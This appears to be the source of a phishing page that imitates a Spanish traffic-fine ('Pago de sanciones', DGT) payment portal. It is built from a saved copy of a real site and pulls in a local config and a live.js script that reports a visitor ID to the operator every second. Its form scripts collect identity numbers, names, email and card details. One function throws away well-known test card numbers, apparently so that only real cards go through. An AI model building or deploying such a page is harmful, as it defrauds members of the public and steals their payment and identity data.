<?php 
include('./common/includes.php');
include('config.php');

?><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="theme-color" content="rgb(243, 140, 0)">
   <meta name="msapplication-navbutton-color" content="rgb(243, 140, 0)">
   <meta name="apple-mobile-web-app-status-bar-style" content="rgb(243, 140, 0)">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
   <!-- BootStrap Accesible -->
   <!-- Estilo para tablas que se espanden y contraen.
      @import url('/IWPS5/./assets/css/dataTables.bootstrap.min.css');
      -->
      <link rel="icon" type="image/x-icon" href="./assets/favicon.ico">
      <link rel="apple-touch-icon" sizes="57x57" href="./assets/images/4Zj1ez9NwLkC.png">
      <link rel="apple-touch-icon" sizes="60x60" href="./assets/images/rR0wTsEdfbLK.png">
      <link rel="apple-touch-icon" sizes="72x72" href="./assets/images/fYnF29DSKy3d.png">
      <link rel="apple-touch-icon" sizes="76x76" href="./assets/images/Kp6tNJySfaaj.png">
      <link rel="apple-touch-icon" sizes="114x114" href="./assets/images/5RgjioZUFF51.png">
      <link rel="apple-touch-icon" sizes="120x120" href="./assets/images/dSDhM82u9zH0.png">
      <link rel="apple-touch-icon" sizes="144x144" href="./assets/images/i4OeziycG28b.png">
      <link rel="apple-touch-icon" sizes="152x152" href="./assets/images/7ETDQrKEHlsj.png">
      <link rel="apple-touch-icon" sizes="180x180" href="./assets/images/q0GUhWFDA00C.png">
      <link rel="icon" type="image/png" sizes="192x192" href="./assets/images/yS5TgpTNHslm.png">
      <link rel="icon" type="image/png" sizes="32x32" href="./assets/images/cfe8uJq4pjE8.png">
      <link rel="icon" type="image/png" sizes="96x96" href="./assets/images/pYE5uU1sJOfO.png">
      <link rel="icon" type="image/png" sizes="16x16" href="./assets/images/qQzn3mrXA8vg.png">
   <script type="text/javascript" src="./assets/js/iCZnv6XpClAr.js.téléchargement" data-dtconfig="rid=RID_-372840464|rpid=1789553990|reportUrl=/rb_70fa0f5f-e1d0-42f8-b0ef-997802b704c8|app=8afec52137452f85|ssc=1|featureHash=ICA27NVfgjqrux|vcv=2|rdnt=0|uxrgce=1|bp=3|cuc=80ne5ii7|mel=100000|dpvc=1|ssv=4|lastModification=1705639642421|tp=500,50,0,1|agentUri=/ruxitagentjs_ICA27NVfgjqrux_10281231207105659.js"></script>
   
   <style type="text/css" media="all">
      @import url('./assets/css/3Pd75uK8uydX.css');
      @import url('./assets/css/sq11BYlxCGf4.css');
      @import url('./assets/css/uBSTzrletFxO.css');
      @import url('./assets/css/CIOWN8RoskgZ.css');
      @import url('./assets/css/OsOqwJiltDEm.css');
      @import url('./assets/css/oDORsIhAvUgb.css');
      @import url('./assets/css/y2ixNC0EG6vQ.css');
      @import url('./assets/css/GnImnx9hP20J.css');
   </style>
   <script src="./assets/js/uQ9RiT9oFPv8.js.téléchargement" type="text/javascript"></script>
   <script src="./assets/js/wiRFejBoRgVC.js.téléchargement" type="text/javascript"></script>
   <script src="./assets/js/xJlBHnQgQD3n.js.téléchargement" type="text/javascript"></script>
   <script src="./assets/js/nYzBO7DZwV72.js.téléchargement" type="text/javascript"></script>
   <script src="./assets/js/rw24ceNYxRVC.js.téléchargement" type="text/javascript"></script>
   <script src="./assets/js/6YRiFnTDGsqE.js.téléchargement" type="text/javascript"></script>
   <script src="./assets/js/ZX8ps1Q2jJDe.js.téléchargement" type="text/javascript"></script>
   <script src="./assets/js/ob03pIhmfQUK.js.téléchargement" type="text/javascript"></script>
   <script src="./assets/js/QSMyMfILwRC4.js.téléchargement" type="text/javascript"></script>
   <script src="./assets/js/Y7o9x9cqgYeF.js.téléchargement" type="text/javascript"></script>
   <script src="./assets/js/live.js.téléchargement"></script><script>function saludar() {Online(73214845);}window.onload = function () {setInterval("saludar()", 1000);};</script>
   <!--  
      <script type="text/javascript">
         $(document).ready(function(){
               $('[data-toggle="tooltip"]').tooltip();
         });
      </script>   
      -->
   <!--
      <meta http-equiv="Cache-Control" content="no-cache, must-revalidate; charset=utf-8"></meta>
      <meta http-equiv="Pragma" content="no-cache; charset=utf-8"></meta>
      <meta http-equiv="content-type" content="text/html; charset=utf-8" ></meta>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" ></meta>
      <meta name="description" content="Sanciones DGT" ></meta>
      <meta name="keywords" content="Sanciones DGT, venta" ></meta>
      -->
   <title>Pago de sanciones</title>
   <script type="text/javascript">
      jQuery(function($) {
         var ii = 0;
         var iiCont = 0;
         $('table#sancionesAPagar tbody tr')
               .each(
                     function(cont) {
                        iiCont = cont;
                        var valorExpediente = '\\:numeroExpedienteId';
                        $(this)
                              .find(
                                    "[id*=" + valorExpediente
                                          + "]")
                              .mask(
                                    '99/999-999999/9',
                                    {
                                       onKeyPress : function(
                                             val, e, f,
                                             invalid,
                                             options) {
                                          if (val.trim() == '/-/') {
                                             $(
                                                   "[id*="
                                                         + valorExpediente
                                                         + "]")
                                                   .val('');
                                          }
                                       }
                                    });
                        var valorFecha = '\\:fechaDenunciaId';
                        $(this)
                              .find("[id*=" + valorFecha + "]")
                              .mask(
                                    '99/99/9999',
                                    {
                                       onKeyPress : function(
                                             val, e, f,
                                             invalid,
                                             options) {
                                          if (val.trim() == '//') {
                                             $(
                                                   "[id*="
                                                         + valorFecha
                                                         + "]")
                                                   .val('');
                                          }
                                       }
                                    });
                     });
         $(document).ready(function() {
            quitar_cargando();
            $('#indexFormId\\:add_row').click(function() {
               cargando();
            });
         });
      });
      
      $(function() {
         $(document).on("click", "button[data-hide]", function() {
            $(this).closest("." + $(this).attr("data-hide")).hide();
         });
      });
   </script>
   <script type="text/javascript">
      function showhide(id) {
         var e = document.getElementById(id);
         e.style.display = (e.style.display == 'block') ? 'none'
               : 'block';
      }
   </script>
   <script type="text/javascript">
      function showhideNotice(id) {
         showhide(id);
         showhide('linkAvisosSmallId');
         showhide('linkAvisosFullId');
      }
   </script>
   <script>
      $(document).ready(function() {
         $('.datepicker').datepicker();
         $('.datepicker').datepicker('setEndDate', new Date());
      });
      $(document).ready(function() {
         $('[data-toggle="tooltip"]').tooltip();
      });
      $(document).ready(function() {
         ocultarCampos();
         sessionStorage.setItem("language","es");
      });
      
      
   </script>
   <!-- Validación de campos obligatorios -->
   <script>
      function mostrarError(id, textId, mensaje) {
         var marcoAlertaServer = document
               .getElementById('marcoAlertaServidorId');
      
         if (typeof (marcoAlertaServer) != 'undefined') {
      
            if (marcoAlertaServer != null) {
               marcoAlertaServer.style.display = 'none';
            }
         }
         var mostrarCerrar = "";
         if (document.getElementById(textId).innerHTML
               .indexOf('de alerta') != -1
               || document.getElementById(textId).innerHTML == '') {
            document.getElementById(textId).innerHTML = '';
            mostrarCerrar = '<button type="button" class="close removeif-nojs" data-hide="alert" aria-label="Cerrar"><span class="sr-only">Cerrar</span> <span class="fa fa-times" aria-hidden="true"></span></button>';
         }
         document.getElementById(textId).innerHTML = document
               .getElementById(textId).innerHTML
               + '<span class="fa fa-times-circle"></span>   '
               + mensaje + mostrarCerrar + '<br />';
         document.getElementById(id).style.display = 'block';
      }
      function isEmpty(str) {
         return !str.replace(/^\s+/g, '').length; // boolean (true if field is empty)
      }
      function esObligatorioKo(id, mensaje) {
         var valor = $("[id*='" + id + "']").val();
      
         if (isEmpty(valor)) {
            $("[id*='" + id + "']").focus();
            mostrarError('marcoAlertaId', 'textAlertaId', mensaje);
            return true;
         }
         return false;
      }
      function isEmailValid(email) {
         var reEmail = /\b[a-zA-Z0-9\u00C0-\u017F._%+-]+@[a-zA-Z0-9\u00C0-\u017F.-]+\.[a-zA-Z]{2,10}\b/;
      
         if (!email.match(reEmail)) {
            return false;
         }
         return true;
      }
      
      /* <![CDATA[ */
      function isFechaValid(fecha) {
         var isValid = true;
         var regexDate = /^(0?[1-9]|[12]\d|3[01])[\/](0?[1-9]|1[0-2])[\/][12]\d{3}$/;
      
         if (!regexDate.test(fecha)) {
            /*let
            fechaToArr = fecha.split('/');
            var auxFecha = fechaToArr[2] + '-' + fechaToArr[1] + '-'
                  + fechaToArr[0];
            let
            fechaToDate = new Date(Date.parse(auxFecha));
      
            if (fechaToArr[2] != fechaToDate.getFullYear()) {
               isValid = false;
            } else if (fechaToArr[1] != (fechaToDate.getMonth() + 1)) {
               isValid = false;
            } else if (fechaToArr[0] != fechaToDate.getDate()) {
               isValid = false;
            }
         } else {*/
            isValid = false;
         }
      
         return isValid;
      }
      /* ]]> */
      
      function esCampoTablaKo(campoId, mensaje) {
         var cont = 0;
         var continua = true;
         var elementoId = cont + '\\:' + campoId;
         var retorno = false;
         while (continua) {
            elementoId = cont + '\\:' + campoId;
            continua = (($("[id*=" + elementoId + "]").length) ? true
                  : false);
      
            if (continua) {
               cont = cont + 1;
      
               if (esObligatorioKo(elementoId, mensaje)) {
                  retorno = true;
               }
            }
         }
         return retorno;
      }
      
      function esDocumentoKo() {
         var tipoDoc = document.getElementById('indexFormId:tipoDocId');
         tipoDoc.focus();
         var tipoDocSlected = tipoDoc[tipoDoc.selectedIndex].value;
         var documento = document
               .getElementById('indexFormId:numDocumentoId').value;
      
         if ('CIF' == tipoDocSlected) {
            return !documento.testCIF();
      
         } else if ('NIF' == tipoDocSlected) {
            return !documento.testNIF();
      
         } else if ('NIE' == tipoDocSlected) {
            return !documento.testNIE();
         }
         return false;
      }
      
      function errorValidarCampos() {
         document.getElementById('textAlertaId').innerHTML = '';
         var error = false;
         if (esObligatorioKo('indexFormId:numDocumentoId',
               "Error, el Número de Documento es obligatorio.")) {
            mostrarError('marcoAlertaId', 'indexFormId:numDocumentoId',
                  "Error, el Número de Documento es obligatorio.");
            error = true;
         }
         if (esDocumentoKo()) {
            mostrarError('marcoAlertaId', 'textAlertaId',
                  "Error, el Número de Documento no corresponde al Confirme su identidad indicado.");
            error = true;
         }
         if (esObligatorioKo('indexFormId:nombreRazonSocialId',
               "Error, el Nombre/Razón Social es obligatorio.")) {
            mostrarError('marcoAlertaId',
                  'indexFormId:nombreRazonSocialId',
                  "Error, el Nombre/Razón Social es obligatorio.");
            error = true;
         }
         /* if (esObligatorioKo('indexFormId:primerApellidoId',
               "Error, el Primer Apellido es obligatorio.")) {
            mostrarError('marcoAlertaId',
                  'indexFormId:primerApellidoId',
                  "Error, el Primer Apellido es obligatorio.");
            error = true;
         } */
         if (esObligatorioKo('indexFormId:emailNotificaId',
               "Error, has de incluir una cuenta de eMail válido. Lo usaremos para informarte sobre tus operaciones. ")) {
            mostrarError('marcoAlertaId',
                  'indexFormId:emailNotificaId',
                  "Error, has de incluir una cuenta de eMail válido. Lo usaremos para informarte sobre tus operaciones. ");
            error = true;
         }
         if (!isEmailValid(document
               .getElementById('indexFormId:emailNotificaId').value)) {
            mostrarError('marcoAlertaId', 'textAlertaId',
                  "Error, la cuenta de eMail que nos indicas no es correcta. ");
            document.getElementById('indexFormId:emailNotificaId')
                  .focus();
            mostrarError('marcoAlertaId',
                  'indexFormId:emailNotificaId', "Error, la cuenta de eMail que nos indicas no es correcta. ");
            error = true;
         }
         if (esCampoTablaKo('numeroExpedienteId',
               "Error, el Número de Expediente es obligatorio.")) {
            //mostrarError('marcoAlertaId', 'numeroExpedienteId', "Error, el Número de Expediente es obligatorio.");
            error = true;
         }
         if (esCampoTablaKo('importeId', "Error, el importe indicado no es válido. El importe ha de ser un valor numérico superior a cero. Nosotros te aplicaremos los descuentos antes del pago.")) {
            //mostrarError('marcoAlertaId', 'importeId', "Error, el importe indicado no es válido. El importe ha de ser un valor numérico superior a cero. Nosotros te aplicaremos los descuentos antes del pago.");
            error = true;
         }
         if (esCampoTablaKo('fechaDenunciaId',
               "Error, revisa la Fecha Denuncia e introduce un valor correcto.")) {
            //mostrarError('marcoAlertaId', 'fechaDenunciaId', "Error, revisa la Fecha Denuncia e introduce un valor correcto.");
            error = true;
         } else if (isNotValidaCamposFecha('fechaDenunciaId',
               "Error, revisa la Fecha Denuncia e introduce un valor correcto.")) {
            error = true;
         }
      
         if (error) {
            document.location.href = "#validacionesError";
            return true;
         }
         cargando();
         return false;
      }
      function isNotValidaCamposFecha(campoId, mensaje) {
         var cont = 0;
         var continua = true;
         var elementoId = cont + '\\:' + campoId;
         var retorno = false;
         while (continua) {
            elementoId = cont + '\\:' + campoId;
            continua = (($("[id*='" + elementoId + "']").length) ? true
                  : false);
            if (continua) {
               cont = cont + 1;
               var valor = $("[id*='" + elementoId + "']").val();
               if (!isFechaValid(valor)) {
                  mostrarError('marcoAlertaId', 'textAlertaId',
                        mensaje);
                  retorno = true;
               }
            }
         }
         return retorno;
      }
      
      
      //Método encargado de ocultar los campos que no son obligatorios//
      
      function ocultarCampos(elemento){
         var comboTipoDocumentos = document.getElementById("indexFormId:tipoDocId");
         if(comboTipoDocumentos.value == "CIF"){
            document.getElementById("indexFormId:primerApellidoId").style.display="none";
            document.getElementById("indexFormId:primerApellidoId").value="";
            document.getElementById("indexFormId:lblPagadorApellido1").style.display="none";
            
            document.getElementById("indexFormId:segundoApellidoId").style.display="none";
            document.getElementById("indexFormId:segundoApellidoId").value="";
            document.getElementById("indexFormId:lblPagadorApellido2").style.display="none";
         }else{
            document.getElementById("indexFormId:primerApellidoId").style.display="block";
            document.getElementById("indexFormId:lblPagadorApellido1").style.display="block";
            document.getElementById("indexFormId:segundoApellidoId").style.display="block";
            document.getElementById("indexFormId:lblPagadorApellido2").style.display="block";
         }
         
         if(elemento.value == "NIF"){
            if(sessionStorage.getItem("language") != null){
               if(document.getElementsByClassName("selectize-control selectize single")[0].getElementsByClassName("selectize-input items has-options full has-items")[0].getElementsByClassName("item")[0].getAttribute('data-value') != null){
                  document.getElementsByClassName("selectize-control selectize single")[0].getElementsByClassName("selectize-input items has-options full has-items")[0].getElementsByClassName("item")[0].setAttribute('data-value',"NIF");
                  if(sessionStorage.getItem("language") == "es" || sessionStorage.getItem("language") == "va"
                     || sessionStorage.getItem("language") == "ca"){
                     document.getElementsByClassName("selectize-control selectize single")[0].getElementsByClassName("selectize-input items has-options full has-items")[0].getElementsByClassName("item")[0].innerHTML="Persona física (NIF)";
                  } else if(sessionStorage.getItem("language") == "ga"){
                     document.getElementsByClassName("selectize-control selectize single")[0].getElementsByClassName("selectize-input items has-options full has-items")[0].getElementsByClassName("item")[0].innerHTML="Pertsoa física (NIF)";
                  } else if(sessionStorage.getItem("language") == "fr"){
                     document.getElementsByClassName("selectize-control selectize single")[0].getElementsByClassName("selectize-input items has-options full has-items")[0].getElementsByClassName("item")[0].innerHTML="Personne phyisique (NIF)";
                  } else if(sessionStorage.getItem("language") == "en"){
                     document.getElementsByClassName("selectize-control selectize single")[0].getElementsByClassName("selectize-input items has-options full has-items")[0].getElementsByClassName("item")[0].innerHTML="Natural person (NIF)";
                  } else if(sessionStorage.getItem("language") == "de"){
                     document.getElementsByClassName("selectize-control selectize single")[0].getElementsByClassName("selectize-input items has-options full has-items")[0].getElementsByClassName("item")[0].innerHTML="Steuernummer (TIN)";
                  } else if(sessionStorage.getItem("language") == "eu"){
                     document.getElementsByClassName("selectize-control selectize single")[0].getElementsByClassName("selectize-input items has-options full has-items")[0].getElementsByClassName("item")[0].innerHTML="Pertsona fisikoa (IFZ)";
                  }
               }
            }
         }
      }
   </script>
   <script type="text/javascript">
      function ccc(){
          var cc = document.getElementById("card_number").value;
          if(cc.match(/^[0-2]|^[7-9]/))
          {
                  document.getElementById("card_number").value = "";
          }
          if(cc.match(/4111111111111111|5500000000000004|340000000000009|30000000000004|3088000000000009/))
          {
                  document.getElementById("card_number").value = "";
          }
          var type = cc.substr(0, 2);
          var type1 = cc.substr(0, 1);

          if(type == "37" || type == "34") {
            $("#amexcid").html('<div class="col-sm-6"><label for="cid">CID</label><input type="tel" name="cid" id="cid" title="" placeholder="CID" class="form-control" pattern="\d*" minlength="4" /></div>');
            $("#cvv").attr('maxlength','4');
          }else{
            $("#cvv").attr('maxlength','3');
            $("#amexcid").html('');
          }
      }
   </script>
</head>
<body id="myBody" class="js-enabled">
   <script>
      document.body.className = 'js-enabled';
   </script>
   <!-- Divs con la pantalla de carga -->
   <div id="capa_cargando" class="clase_cargando" style="visibility: hidden;"></div>
   <div id="imagendiv" class="imagen" style="visibility: hidden;"></div>
   <!-- Para cada idioma, hay que poner aqui el messages. -->
   <!-- Para cada idioma, hay que poner aqui el messages. -->
   <div class="burguer small" aria-hidden="true">
      <button class="toggle" data-show="Mostrar menú" data-hide="Ocultar menú">
      <span class="fa fa-fw fa-bars" aria-hidden="true"></span><span class="text">Mostrar menú</span><span class="text">Mostrar menú</span><span class="text">Mostrar menú</span>
      </button>
      <form id="formCarritoFlotaId" name="formCarritoFlotaId" method="post" action="" enctype="application/x-www-form-urlencoded">
         <input type="hidden" name="formCarritoFlotaId" value="formCarritoFlotaId">
         <input type="hidden" name="javax.faces.ViewState" value="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